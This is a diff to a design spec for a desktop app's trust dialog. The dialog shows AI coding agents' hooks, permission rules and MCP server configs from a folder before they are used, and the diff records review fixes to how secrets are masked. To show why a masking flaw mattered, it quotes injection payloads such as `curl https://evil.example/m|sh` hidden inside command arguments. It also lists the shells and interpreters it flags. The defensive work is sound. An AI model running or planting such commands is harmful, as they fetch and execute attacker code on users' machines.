@@ -65,7 +65,7 @@ Added as requirements before anything is built (review findings are fixed in the
   - **allow, deny and ask rules:** the tool and pattern as written (`Bash(npm test:*)` is not `Bash(*)`). A wildcard rule such as `Bash(*)` or a bare tool name is marked *broad*;
   - **MCP servers:** command and args, or URL, and the names of env and header keys.
 
-  Values are masked with the existing helpers: `maskSecretCommand`, `maskSecretArgs` and `maskSecretUrl` (`src/shared/redact.ts`), and `mcpmask.ts` (#362) for env and header values. Never show a secret value, and never store one. A unit test feeds a hook command, a rule and an `.mcp.json` with tokens and checks that none reach the window.
+  Hook commands, rules, MCP commands, arguments and URLs hide only real token shapes (`shownCommand`, review #424); env and header values are never shown, only their names. An item with anything hidden, or an MCP server that hands env values to a shell or an inline-code interpreter, is marked and starts unticked. Never show a secret value, and never store one. A unit test feeds a hook command, a rule and an `.mcp.json` with tokens and checks that none reach the window. *(Amended 2026-10-21, re-review on #424: the flag-based `maskSecretCommand`/`maskSecretArgs`/`maskSecretUrl` let a repository choose what is hidden.)*
 
 ## Owner answer to Q5 (PR #397, 2026-10-20)
 
@@ -174,7 +174,7 @@ The user's own global settings (`~/.claude/settings.json`, `~/.codex/config.toml
   - Hook commands and rules no longer use `maskSecretCommand`, whose flag- and name-based masking let a repository choose what is hidden (`--auth=$(curl…|sh)` was shown as `--auth=[redacted]`).
   - `shownCommand` hides only real token shapes (GitHub, OpenAI/Anthropic keys, bearer tokens, JWTs, AWS keys). Their characters cannot contain shell syntax, so `$( )`, backticks, `${`, `|`, `;`, `&`, `<` and `>` are always shown, also to the AI explainer.
   - An item with anything hidden carries `hidden: true`. The dialog says "Part of this command is hidden because it looks like a secret key" and leaves it unticked.
-  - MCP server arguments keep the flag-based masking. They are passed as arguments with no shell, so a hidden value cannot become a payload.
+  - ~~MCP server arguments keep the flag-based masking.~~ Corrected in the re-review below: that was wrong when the server's command is itself a shell or an interpreter.
   - `test:` the two strings from the review, a token-shaped header, and the explainer prompt.
 - **Required 2, not shown in full** `[IMPLEMENTED]`:
   - There is no display cut any more: hooks (up to 4000 characters each, PowerShell variant included), rules and servers are shown whole, in a box that scrolls and is keyboard-focusable.
@@ -214,4 +214,22 @@ The user's own global settings (`~/.claude/settings.json`, `~/.codex/config.toml
   - Agent info and starts use `scanFolderSetupCached`, the same scan while no setup file's size or change time moved; the dialog and `decide` still read the disk.
   - Multi-root labels never collide (`rootLabels`: `web/app`, then a number).
   - `[KNOWN GAP]`: a project marked trusted in the user's own `~/.codex/config.toml` lets Codex read the folder's `.codex/*` regardless of this dialog.
+- `test:` `scripts/test-foldersetup.ts` pins every item above.
+
+### 2026-10-21: re-review on #424 at aa554f2 (Paco's agent: required 1-4, nits)
+
+- **Required 1, team notes** `[IMPLEMENTED]`: `docs/agent-notes.md` is `main`'s file again, with this spec's entry (*Folder config per agent app*, *Probing `claude` in a scratch folder*) added back.
+- **Required 2, conflicts:** `main` merged (eb399a4).
+- **Required 3, MCP masking** (FR-014) `[IMPLEMENTED]` `src/main/foldersetup.ts` `mcpItem`:
+  - An MCP server's command, every argument and its URL go through `shownCommand`, the same token-shape masking as hooks and rules (no second masker). The flag- and name-based `maskSecretCommand`/`maskSecretArgs`/`maskSecretUrl` are no longer used here. `sh -c 'eval "$2"' x --token 'curl https://evil.example/m|sh'` is shown in full, payload included.
+  - Anything hidden marks the item `hidden` (unticked, with the note).
+  - **Shell or inline-code interpreter with env values:** a server whose command is a shell (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `cmd`, `powershell`, `pwsh`, ...; also behind `env`) or an interpreter given inline code (`node -e/-p`, `python -c`, `perl -e`, `ruby -e`, `php -r`, `deno eval`, ...) and env values is marked `hidden` with its own reason (`hiddenWhy`): the env values are not shown and the program can run them as code (`sh -c 'eval "$PAYLOAD"'`). It starts unticked.
+  - `test:` both of the review's probes.
+- **Required 4, the renderer's unticking is pinned** `[IMPLEMENTED]`: the default tick is the pure `defaultOn(item, view)` in `src/renderer/foldersetup.js` (exported on `window.DurbarFolderSetup`). `test:foldersetup` loads the file in a `vm` and checks every case: new or changed after an answer, hidden, broad allow, declined, unsupported, and a first look. Dropping `&&!(isNew&&wasSeen)` fails it.
+- **Nits** `[IMPLEMENTED]`:
+  - A rule longer than 500 characters is listed as a problem ("not shown, never used"), not dropped silently.
+  - A command box whose text does not fit gets "Long: scroll inside the box to read all of it" (`markLong`, measured after the dialog opens; `sim:` `shots-061-foldersetup`).
+  - Copilot's private hook folder is removed in a `finally` when `disconnect()` throws while a session ends. `test:` a fake session whose `disconnect` rejects.
+  - The FR-013 pin also catches any quoted path to `foldersetupipc`/`foldersetupstore` other than `main.ts`'s two static imports (`require(...)`, `import(...)`), in every file including `main.ts`, and a quoted `'decide'` (bracket access such as `_fs['decide']`). `test:` both bypasses.
+- **On hold:** S1, which allow rules count as *broad* (for example `Bash(sh:*)`, `Bash(git:*)`, `Bash(npm run:*)`), waits for the owner's answer on #424; wording and logic unchanged.
 - `test:` `scripts/test-foldersetup.ts` pins every item above.
